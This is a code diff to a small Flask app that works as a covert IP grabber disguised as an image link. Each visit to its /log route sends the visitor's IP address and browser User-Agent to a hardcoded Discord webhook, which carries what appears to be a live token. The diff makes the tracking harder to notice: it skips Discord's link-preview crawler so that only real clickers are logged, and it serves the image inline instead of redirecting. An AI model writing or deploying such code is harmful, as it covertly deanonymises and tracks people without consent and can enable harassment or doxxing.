@@ -1,4 +1,4 @@
-from flask import Flask, request, redirect, Response
+from flask import Flask, request, Response
 import requests
 
 app = Flask(__name__)
@@ -6,13 +6,31 @@ app = Flask(__name__)
 WEBHOOK = "https://discord.com/api/webhooks/1506122380609720390/KtiAgpewzZHsYscE0O8rm6KuXbilnDUxzHoTQq4_o-BKgI17EK4NGxFWFqwO-T0KEXPP"
 IMAGE_URL = "https://i.pinimg.com/originals/fd/9d/6c/fd9d6c58250e85c4192c0032f24e12ce.jpg"
 
+# Pre-fetch the image once to avoid delays
+image_data = None
+content_type = "image/jpeg"
+
+try:
+    resp = requests.get(IMAGE_URL, timeout=10)
+    resp.raise_for_status()
+    image_data = resp.content
+    content_type = resp.headers.get('content-type', 'image/jpeg')
+except:
+    # Fallback: a tiny transparent GIF
+    image_data = b'R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7'
+    content_type = "image/gif"
+
 @app.route('/log')
 def log():
-    ip = request.headers.get('X-Forwarded-For', '').split(',')[0] or request.remote_addr
+    ip = request.headers.get('X-Forwarded-For', '').split(',')[0].strip() or request.remote_addr
     ua = request.headers.get('User-Agent', '')
-    try:
-        requests.post(WEBHOOK, json={"content": f"IP: {ip}\nUA: {ua}"})
-    except:
-        pass
-    # Redirect to the static image
-    return redirect(IMAGE_URL)
+
+    # Log only if the request is NOT from Discord crawler
+    if 'discord' not in ua.lower():
+        try:
+            requests.post(WEBHOOK, json={"content": f"IP: {ip}\nUA: {ua}"}, timeout=5)
+        except:
+            pass
+
+    # Return the image directly (not a redirect)
+    return Response(image_data, status=200, mimetype=content_type)
